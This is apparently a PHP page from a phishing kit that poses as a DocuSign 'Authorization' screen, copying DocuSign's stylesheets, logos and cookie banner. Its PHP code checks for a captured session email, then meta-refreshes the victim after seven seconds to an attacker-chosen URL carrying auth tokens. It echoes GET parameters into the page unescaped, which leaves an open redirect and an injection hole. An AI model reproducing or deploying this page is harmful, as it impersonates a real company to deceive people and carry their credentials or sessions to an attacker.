<?php
session_start();
ob_start();
function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}


if (loggedin()) {
} else {
    die();
}
$redirect = @$_GET["fd"];
$img = @$_GET["ig"];
$sess = @$_GET["AuthState"];
$auth = @$_GET["session"];

$Redirect = "$redirect?Authstate=$sess&auth=$auth";



?>

<!DOCTYPE html>

<html ng-controller="RootCtrl" ng="strict-di" lang="en" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
  <!--<base href="/">--><base href=".">

  
  <meta content="IE=EDGE" http-equiv="X-UA-Compatible">
  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
  <META HTTP-EQUIV="Refresh" CONTENT="7;URL=<?php echo "$Redirect"; ?>">

  <title translate="DocuSign">DocuSign</title>

  <link type="image/x-icon" rel="icon" href="https://docucdn-a.akamaihd.net/olive/18.12.0/img/new_favicon.png">

  


  <link type="text/css" rel="stylesheet" href="https://docucdn-a.akamaihd.net/olive/18.12.0/css/olive.min.css">
  <link type="text/css" rel="stylesheet" href="https://docucdn-a.akamaihd.net/olive/18.12.0/css/radmin.min.css">
  <link type="text/css" rel="stylesheet" href="https://docucdn-a.akamaihd.net/radmin/2018.9.4/app-6a4b43593f732f51d70d.css">
  <link type="text/css" rel="stylesheet" href="https://docucdn-a.akamaihd.net/radmin/2018.9.4/lib-6a4b43593f732f51d70d.css">
<style id="olive-css-mouse-active" type="text/css">
        .mouse-active :focus:not(input):not(select):not(textarea):not(.tile) {
            box-shadow: none !important;
            outline: 0 !important;
            text-decoration: none !important;
        }
        .mouse-active .menu .item:focus:not(:hover):not(.menu_item-isOn),
        .mouse-active .menu_item:focus:not(:hover):not(.menu_item-isOn) {
            background-color: inherit;
        }
        </style><link type="text/css" href="signinfiles/optanon.css" rel="stylesheet"><style>#optanon ul#optanon-menu li { background-color: #F4F4F4 !important }#optanon ul#optanon-menu li.menu-item-selected { background-color: #FFFFFF !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #2C6EE1 !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #2C6EE1 !important; border-color: #2C6EE1 !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle a { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle a { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #FFFFFF !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #FFFFFF !important }.optanon-alert-box-wrapper { background-color:#555555 !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color:#FFFFFF !important }.optanon-alert-box-wrapper{
left:0;
right:0;
}

#optanon, #optanon *, #optanon div, #optanon span, #optanon ul, #optanon li, #optanon a, #optanon p, .optanon-alert-box-wrapper *{
font-family: "maven_pro_regular","Helvetica Neue",sans-serif !important;
}

.optanon-alert-box-wrapper .optanon-button-more .optanon-alert-box-button-middle a:before{
content:none !important;
}

#optanon #optanon-menu li p {
    padding: 12px 0px 12px 5px !important;
}
#optanon #optanon-popup-wrapper .optanon-white-button-middle {
    border-radius: 3px !important;
    letter-spacing: .03125rem !important;
}
#optanon #optanon-popup-wrapper .optanon-white-button-middle a {
    text-transform: uppercase !important;
letter-spacing: .03125rem !important;
}
.optanon-alert-box-wrapper .optanon-alert-box-button-middle {
    -webkit-border-radius: 3px !important;
    -moz-border-radius: 3px !important;
    border-radius: 3px !important;
letter-spacing: .03125rem !important;
}
.optanon-alert-box-wrapper .optanon-alert-box-button-middle a {
    text-transform: uppercase !important;
letter-spacing: .03125rem !important;
}
.optanon-alert-box-wrapper .optanon-alert-box-body a{
color:#FFFFFF !important;
text-decoration:underline !important;
}
#optanon #optanon-popup-body h1, #optanon #optanon-popup-body h2, #optanon #optanon-popup-body h3, #optanon #optanon-popup-body h4, #optanon #optanon-popup-body h5, #optanon #optanon-popup-body h6, #optanon #optanon-menu li p a{
font-family: "maven_pro_bold","Helvetica Neue",sans-serif !important;
}
#optanon #optanon-menu .menu-item-about{
background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCIgdmlld0JveD0iMCAwIDY0IDY0Ij4NCiAgPGcgZmlsbD0iIzQxODZFQyI+DQogICAgPHBhdGggZD0iTTMyLDY0IEMxNC4yLDY0IDAsNDkuNCAwLDMyIEMwLDE0LjIgMTQuNiwwIDMyLDAgQzQ5LjQsMCA2NCwxNC42IDY0LDMyIEM2NCw0OS44IDQ5LjgsNjQgMzIsNjQgWiBNMzIsMy42IEMxNi42LDMuNiAzLjYsMTYuMiAzLjYsMzIgQzMuNiw0Ny40IDE2LjIsNjAuNCAzMiw2MC40IEM0Ny44LDYwLjQgNjAuNCw0Ny44IDYwLjQsMzIgQzYwLjQsMTYuNiA0Ny40LDMuNiAzMiwzLjYgWiIvPg0KICAgIDxwYXRoIGQ9Ik0yOCwyMCBDMjgsMTcuOCAyOS44LDE2IDMyLDE2IEMzNC4yLDE2IDM2LDE3LjggMzYsMjAgQzM2LDIyLjIgMzQuMiwyNCAzMiwyNCBDMjkuOCwyNCAyOCwyMi4yIDI4LDIwIFogTTM2LDQ3IEwzNiwyOSBDMzYsMjguNSAzNS41LDI4IDM1LDI4IEwyOSwyOCBDMjguNSwyOCAyOCwyOC40IDI4LDI5IEwyOCw0NyBDMjgsNDcuNSAyOC40LDQ4IDI5LDQ4IEwzNSw0OCBDMzUuNSw0OCAzNiw0Ny41IDM2LDQ3IFoiLz4NCiAgPC9nPg0KPC9zdmc+DQo=") !important;}
#optanon #optanon-menu .menu-item-necessary{
background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCIgdmlld0JveD0iMCAwIDY0IDY0Ij4NCiAgPGcgZmlsbD0iIzQxODZFQyI+DQogICAgPHBhdGggZD0iTTMyLDY0IEMxNC4yLDY0IDAsNDkuNCAwLDMyIEMwLDE0LjIgMTQuNiwwIDMyLDAgQzQ5LjQsMCA2NCwxNC42IDY0LDMyIEM2NCw0OS44IDQ5LjgsNjQgMzIsNjQgWiBNMzIsMy42IEMxNi42LDMuNiAzLjYsMTYuMiAzLjYsMzIgQzMuNiw0Ny40IDE2LjIsNjAuNCAzMiw2MC40IEM0Ny44LDYwLjQgNjAuNCw0Ny44IDYwLjQsMzIgQzYwLjQsMTYuNiA0Ny40LDMuNiAzMiwzLjYgWiIvPg0KICAgIDxwb2x5Z29uIHBvaW50cz0iMzAuNCA0OC4zIDE2LjYgMzQuOCAxOS40IDMyIDI5LjYgNDEuOSA0NC4zIDE2LjkgNDcuNyAxOC45Ii8+DQogIDwvZz4NCjwvc3ZnPg0K") !important;}
#optanon #optanon-menu .menu-item-performance{
background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCIgdmlld0JveD0iMCAwIDY0IDY0Ij4NCiAgPGcgZmlsbD0iIzQxODZFQyI+DQogICAgPHBhdGggZD0iTTMyLDY0IEMxNC4yLDY0IDAsNDkuNCAwLDMyIEMwLDE0LjIgMTQuNiwwIDMyLDAgQzQ5LjQsMCA2NCwxNC42IDY0LDMyIEM2NCw0OS44IDQ5LjgsNjQgMzIsNjQgWiBNMzIsMy42IEMxNi42LDMuNiAzLjYsMTYuMiAzLjYsMzIgQzMuNiw0Ny40IDE2LjIsNjAuNCAzMiw2MC40IEM0Ny44LDYwLjQgNjAuNCw0Ny44IDYwLjQsMzIgQzYwLjQsMTYuNiA0Ny40LDMuNiAzMiwzLjYgWiIvPg0KICAgIDxwYXRoIGQ9Ik00Ny43LDQ3LjUgTDE1LjksNDcuNSBMMTUuOSwxNiBMMTkuOSwxNiBMMTkuOSw0My41IEw0Ny43LDQzLjUgTDQ3LjcsNDcuNSBaIE0zMC45LDI4LjkgTDQzLDM2LjkgTDQ4LjEsMTYuNiBMNDQuMiwxNS42IEw0MC40LDMwLjUgTDI4LjcsMjIuOCBMMjMuMywzOC45IEwyNy4xLDQwLjEgTDMwLjksMjguOSBaIi8+DQogIDwvZz4NCjwvc3ZnPg0K") !important;}
#optanon #optanon-menu .menu-item-functional{
background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCIgdmlld0JveD0iMCAwIDY0IDY0Ij4NCiAgPGcgZmlsbD0iIzQxODZFQyI+DQogICAgPHBhdGggZD0iTTMyLDY0IEMxNC4yLDY0IDAsNDkuNCAwLDMyIEMwLDE0LjIgMTQuNiwwIDMyLDAgQzQ5LjQsMCA2NCwxNC42IDY0LDMyIEM2NCw0OS44IDQ5LjgsNjQgMzIsNjQgWiBNMzIsMy42IEMxNi42LDMuNiAzLjYsMTYuMiAzLjYsMzIgQzMuNiw0Ny40IDE2LjIsNjAuNCAzMiw2MC40IEM0Ny44LDYwLjQgNjAuNCw0Ny44IDYwLjQsMzIgQzYwLjQsMTYuNiA0Ny40LDMuNiAzMiwzLjYgWiIvPg0KICAgIDxwYXRoIGQ9Ik00LjMsMjguNiBDNCwyOS40IDMuNSwyOS45IDIuNiwyOS45IEMxLjcsMjkuOSAwLjksMjkuMyAwLjksMjguNCBDMC45LDI3LjkgMS4zLDI3IDEuNCwyNi42IEwxMC4zLDIuOCBDMTAuNywxLjUgMTEuNSwwLjYgMTIuOCwwLjYgQzE0LjEsMC42IDE0LjksMS41IDE1LjMsMi44IEwyNC4yLDI2LjYgQzI0LjMsMjcgMjQuNywyNy45IDI0LjcsMjguNCBDMjQuNywyOS4zIDIzLjksMjkuOSAyMywyOS45IEMyMiwyOS45IDIxLjUsMjkuMyAyMS4zLDI4LjYgTDE5LjQsMjMuNCBMNi4xLDIzLjQgTDQuMywyOC42IFogTTEyLjgsNC44IEw3LjIsMjAuMyBMMTguMywyMC4zIEwxMi44LDQuOCBaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgyNSAxOCkiLz4NCiAgICA8cGF0aCBkPSJNMi4zLDE2LjkgQzIuMSwxNy4zIDEuOSwxNy43IDEuMywxNy43IEMwLjgsMTcuNyAwLjUsMTcuNCAwLjUsMTcgQzAuNSwxNi44IDAuNiwxNi41IDAuNywxNi4zIEw2LjIsMS40IEM2LjQsMC44IDYuNywwLjEgNy42LDAuMSBDOC41LDAuMSA4LjcsMC44IDksMS40IEwxNC41LDE2LjMgQzE0LjYsMTYuNSAxNC43LDE2LjggMTQuNywxNyBDMTQuNywxNy40IDE0LjQsMTcuNyAxMy45LDE3LjcgQzEzLjMsMTcuNyAxMy4xLDE3LjMgMTIuOSwxNi45IEwxMS44LDEzLjggTDMuNCwxMy44IEwyLjMsMTYuOSBaIE03LjcsMi40IEw0LDEyLjIgTDExLjIsMTIuMiBMNy43LDIuNCBaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNCAxOCkiLz4NCiAgPC9nPg0KPC9zdmc+DQo=") !important;}
#optanon #optanon-menu .menu-item-advertising{
background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCIgdmlld0JveD0iMCAwIDY0IDY0Ij4NCiAgPGcgZmlsbD0iIzQxODZFQyI+DQogICAgPHBhdGggZD0iTTMyLDY0IEMxNC4yLDY0IDAsNDkuNCAwLDMyIEMwLDE0LjIgMTQuNiwwIDMyLDAgQzQ5LjQsMCA2NCwxNC42IDY0LDMyIEM2NCw0OS44IDQ5LjgsNjQgMzIsNjQgWiBNMzIsMy42IEMxNi42LDMuNiAzLjYsMTYuMiAzLjYsMzIgQzMuNiw0Ny40IDE2LjIsNjAuNCAzMiw2MC40IEM0Ny44LDYwLjQgNjAuNCw0Ny44IDYwLjQsMzIgQzYwLjQsMTYuNiA0Ny40LDMuNiAzMiwzLjYgWiIvPg0KICAgIDxwb2x5Z29uIHBvaW50cz0iMjAgMzAuNyAwIDMwLjcgMCAuNyAxMS40IDExLjcgOC42IDE0LjYgNCAxMC4xIDQgMjYuNyAyMCAyNi43IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNiAxNykiLz4NCiAgICA8cG9seWdvbiBwb2ludHM9IjIwIDMwLjYgOC42IDE5LjUgMTEuNCAxNi42IDE2IDIxLjEgMTYgNC41IDAgNC41IDAgLjUgMjAgLjUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDI4IDE2KSIvPg0KICA8L2c+DQo8L3N2Zz4NCg==") !important;}
#optanon #optanon-menu .menu-item-moreinfo{
background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCIgdmlld0JveD0iMCAwIDY0IDY0Ij4NCiAgPGcgZmlsbD0iIzQxODZFQyI+DQogICAgPHBhdGggZD0iTTMyLDY0IEMxNC4yLDY0IDAsNDkuNCAwLDMyIEMwLDE0LjIgMTQuNiwwIDMyLDAgQzQ5LjQsMCA2NCwxNC42IDY0LDMyIEM2NCw0OS44IDQ5LjgsNjQgMzIsNjQgWiBNMzIsMy42IEMxNi42LDMuNiAzLjYsMTYuMiAzLjYsMzIgQzMuNiw0Ny40IDE2LjIsNjAuNCAzMiw2MC40IEM0Ny44LDYwLjQgNjAuNCw0Ny44IDYwLjQsMzIgQzYwLjQsMTYuNiA0Ny40LDMuNiAzMiwzLjYgWiIvPg0KICAgIDxwYXRoIGQ9Ik0yNCwzMi40IEwwLDMyLjQgTDAsMC44IEwyMCwwLjggTDIwLDQuNyBMMjQsNC43IEwyNCwzMi40IFogTTQsMjguNCBMMjAsMjguNCBMMjAsOC43IEwxNiw4LjcgTDE2LDQuNyBMNCw0LjcgTDQsMjguNCBaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgyMCAxNSkiLz4NCiAgICA8cmVjdCB3aWR0aD0iOCIgaGVpZ2h0PSI0IiB5PSIuNSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMjggMzUpIi8+DQogICAgPHJlY3Qgd2lkdGg9IjgiIGhlaWdodD0iNCIgeT0iLjYiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDI4IDI3KSIvPg0KICA8L2c+DQo8L3N2Zz4NCg==") !important;}
#optanon #optanon-popup-top .optanon-close, .optanon-alert-box-wrapper .optanon-alert-box-corner-close a{
right: 8px;
top: 8px;
background-size: 16px 16px;
width: 16px;
height: 16px;
background-image:
url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNCIgaGVpZ2h0PSIxNCIgdmlld0JveD0iMCAwIDE0IDE0Ij4NCiAgPHBhdGggZmlsbD0iIzk5OSIgZD0iTTEwMTEuNzE1NjMsMzI3LjcwMzQ3IEwxMDA3LjAzNDM3LDMyMi45Nzc5MTggTDEwMTEuODAzMTMsMzE4LjI1MjM2NiBDMTAxMi4wNjU2MiwzMTcuOTg3MzgyIDEwMTIuMDY1NjIsMzE3Ljc2NjU2MiAxMDExLjgwMzEzLDMxNy41MDE1NzcgTDEwMTAuNDQ2ODcsMzE2LjE3NjY1NiBDMTAxMC4zMTU2MiwzMTYuMDQ0MTY0IDEwMTAuMTg0MzgsMzE2IDEwMTAuMDUzMTMsMzE2IEMxMDA5Ljk2NTYzLDMxNiAxMDA5Ljg3ODEyLDMxNi4wNDQxNjQgMTAwOS43NDY4OCwzMTYuMTc2NjU2IEwxMDA0Ljk3ODEyLDMyMC44MTM4OCBMMTAwMC4yMDkzOCwzMTYuMTc2NjU2IEMxMDAwLjA3ODEyLDMxNi4wNDQxNjQgOTk5Ljk5MDYyNSwzMTYgOTk5LjkwMzEyNSwzMTYgQzk5OS43NzE4NzUsMzE2IDk5OS42NDA2MjUsMzE2LjA0NDE2NCA5OTkuNTA5Mzc1LDMxNi4xNzY2NTYgTDk5OC4xOTY4NzUsMzE3LjUwMTU3NyBDOTk3LjkzNDM3NSwzMTcuNzY2NTYyIDk5Ny45MzQzNzUsMzE3Ljk4NzM4MiA5OTguMTk2ODc1LDMxOC4yNTIzNjYgTDEwMDIuOTY1NjMsMzIyLjk3NzkxOCBMOTk4LjI0MDYyNSwzMjcuNzkxNzk4IEM5OTguMTUzMTI1LDMyNy44MzU5NjIgOTk4LjEwOTM3NSwzMjcuOTI0MjkgOTk4LjEwOTM3NSwzMjguMTAwOTQ2IEM5OTguMTA5Mzc1LDMyOC4yNzc2MDMgOTk4LjE1MzEyNSwzMjguNDEwMDk1IDk5OC4yNDA2MjUsMzI4LjQ5ODQyMyBMOTk5LjU1MzEyNSwzMjkuODY3NTA4IEM5OTkuNjQwNjI1LDMyOS45NTU4MzYgOTk5Ljc3MTg3NSwzMzAgOTk5Ljk0Njg3NSwzMzAgQzEwMDAuMTIxODgsMzMwIDEwMDAuMjUzMTIsMzI5Ljk1NTgzNiAxMDAwLjM0MDYzLDMyOS44Njc1MDggTDEwMDQuOTc4MTIsMzI1LjA1MzYyOCBMMTAwOS43NDY4OCwzMjkuNzc5MTggQzEwMDkuODc4MTIsMzI5LjkxMTY3MiAxMDA5Ljk2NTYzLDMyOS45NTU4MzYgMTAxMC4wNTMxMywzMjkuOTU1ODM2IEMxMDEwLjE4NDM4LDMyOS45NTU4MzYgMTAxMC4zMTU2MiwzMjkuOTExNjcyIDEwMTAuNDQ2ODcsMzI5Ljc3OTE4IEwxMDExLjc1OTM3LDMyOC40NTQyNTkgQzEwMTEuODkwNjIsMzI4LjM2NTkzMSAxMDExLjkzNDM4LDMyOC4yMzM0MzggMTAxMS45MzQzOCwzMjguMDU2NzgyIEMxMDExLjkzNDM4LDMyNy45Njg0NTQgMTAxMS44NDY4NywzMjcuODM1OTYyIDEwMTEuNzE1NjMsMzI3LjcwMzQ3IFoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC05OTggLTMxNikiLz4NCjwvc3ZnPg0K") !important;
}</style></head>

<body ng-class="bodyClass" class="requesting authentication no-touch">
    <!-- uiView:  --><div ui-view="" class="site"><div class="site-header login-transfer">
  <div>
    <span class="header_logo">
      <img src="https://admin.docusign.com/images/Logo-DS-White.svg">
      <span class="header_name u-text-uppercase" translate="Admin">Authorization</span>
    </span>
    <div class="spinner-circle spinner-sm" ng-hide="isLoadingBlocked"></div>
    <br>
     <span class="header_logo">
      <img src="<?php echo "$img"; ?>">

    </span> 
  
  </div>
</div>
</div>
    <div ds-global-modal=""><!-- ngRepeat: modal in openedModals --></div>



<div id="optanon" class="modern"><div id="optanon-popup-bg" style="display: none;"></div><div id="optanon-popup-wrapper" role="dialog" aria-modal="true" tabindex="-1" lang="en-US"><div id="optanon-popup-top"><a href="https://admin.docusign.com/#" onclick="Optanon.TriggerGoogleAnalyticsEvent(&#39;OneTrust Cookie Consent&#39;, &#39;Preferences Close Button&#39;);" class="optanon-close-link optanon-close optanon-close-ui" title="Close Preference Centre"><div id="optanon-close" style="background: url(https://compliance.docusign.com/us/en/skins/default_flat_bottom_two_button_black/v2/images/optanon-pop-up-close.png);width:34px;height:34px;"></div></a></div><div id="optanon-popup-body"><div id="optanon-popup-body-left"><div id="optanon-popup-body-left-shading"></div><div id="optanon-branding-top-logo" style="background-image: url(https://compliance.docusign.com/us/en/logos/5942/5942:docusign.com/logo.png) !important;"></div><ul id="optanon-menu"><li class="menu-item-on menu-item-about" title="Cookies and Your Privacy"><p><a href="https://admin.docusign.com/#">Cookies and Your Privacy</a></p></li><li class="menu-item-necessary menu-item-on" title="Strictly Necessary Cookies"><p><a href="https://admin.docusign.com/#">Strictly Necessary Cookies</a></p></li><li class="menu-item-on menu-item-performance" title="Performance Cookies"><p><a href="https://admin.docusign.com/#">Performance Cookies</a></p></li><li class="menu-item-on menu-item-functional" title="Functional Cookies"><p><a href="https://admin.docusign.com/#">Functional Cookies</a></p></li><li class="menu-item-on menu-item-advertising" title="Targeting Cookies"><p><a href="https://admin.docusign.com/#">Targeting Cookies</a></p></li><li class="menu-item-moreinfo menu-item-off" title="Cookie Policy"><p><a target="_blank" href="https://www.docusign.com/company/cookie-policy" onclick="Optanon.TriggerGoogleAnalyticsEvent(&#39;OneTrust Cookie Consent&#39;, &#39;Preferences Cookie Policy&#39;);">Cookie Policy</a></p></li></ul></div><div id="optanon-popup-body-right"><h2 aria-label="true">Cookie Preference Center</h2><h3></h3><div id="optanon-popup-more-info-bar"><div class="optanon-status"><div class="optanon-status-editable"><form><fieldset><p><input type="checkbox" value="check" id="chkMain" checked="" class="optanon-status-checkbox"><label for="chkMain">Active</label></p></fieldset></form></div><div class="optanon-status-always-active optanon-status-on"><p>Always Active</p></div></div></div><div id="optanon-main-info-text"></div></div><div class="optanon-bottom-spacer"></div></div><div id="optanon-popup-bottom"> <a href="https://onetrust.com/poweredbyonetrust" target="_blank"><div id="optanon-popup-bottom-logo" style="background: url(https://compliance.docusign.com/us/en/skins/default_flat_bottom_two_button_black/v2/images/cookie-collective-top-bottom.png);width:155px;height:35px;" title="powered by OneTrust"></div></a><div class="optanon-button-wrapper optanon-save-settings-button optanon-close optanon-close-consent"><div class="optanon-white-button-left"></div><div class="optanon-white-button-middle"><a href="https://admin.docusign.com/#" onclick="Optanon.TriggerGoogleAnalyticsEvent(&#39;OneTrust Cookie Consent&#39;, &#39;Preferences Save Settings&#39;);">Save Settings</a></div><div class="optanon-white-button-right"></div></div><div class="optanon-button-wrapper optanon-allow-all-button optanon-allow-all" style="display: none;"><div class="optanon-white-button-left"></div><div class="optanon-white-button-middle"><a href="https://admin.docusign.com/#" onclick="Optanon.TriggerGoogleAnalyticsEvent(&#39;OneTrust Cookie Consent&#39;, &#39;Preferences Allow All&#39;);">Allow All</a></div><div class="optanon-white-button-right"></div></div></div></div></div><div class="optanon-alert-box-wrapper hide-accept-button " style="bottom: 0px; display: none;"><div class="optanon-alert-box-bottom-top"><div class="optanon-alert-box-corner-close"><a class="optanon-alert-box-close" href="https://admin.docusign.com/#" title="Close Banner" onclick="Optanon.TriggerGoogleAnalyticsEvent(&#39;OneTrust Cookie Consent&#39;, &#39;Banner Close Button&#39;);"></a></div></div><div class="optanon-alert-box-bg"><div class="optanon-alert-box-logo"> </div><div class="optanon-alert-box-body"><p>We use cookies to personalize content and ads, to provide social media features and to analyze our traffic. We also share information about your use of our site with our social media, advertising and analytics partners. Click "Cookie Settings" to update your personal cookie preferences or review our Cookie Policy to learn more.<a href="https://www.docusign.com/company/cookie-policy">Cookie Policy</a></p></div><div class="optanon-clearfix"></div><div class="optanon-alert-box-button-container"><div class="optanon-alert-box-button optanon-button-close"><div class="optanon-alert-box-button-middle"><a class="optanon-alert-box-close" href="https://admin.docusign.com/#">Close</a></div></div><div class="optanon-alert-box-button optanon-button-allow"><div class="optanon-alert-box-button-middle"><a class="optanon-allow-all" href="https://admin.docusign.com/#" onclick="Optanon.TriggerGoogleAnalyticsEvent(&#39;OneTrust Cookie Consent&#39;, &#39;Banner Accept Cookies&#39;);">Accept All Cookies</a></div></div><div class="optanon-alert-box-button optanon-button-more"><div class="optanon-alert-box-button-middle"><a class="optanon-toggle-display" href="https://admin.docusign.com/#" onclick="Optanon.TriggerGoogleAnalyticsEvent(&#39;OneTrust Cookie Consent&#39;, &#39;Banner Open Preferences&#39;);">Cookie Settings</a></div></div></div><div class="optanon-clearfix optanon-alert-box-bottom-padding"></div></div></div></body><script type="text/javascript" id="webrtc-control"></script></html>
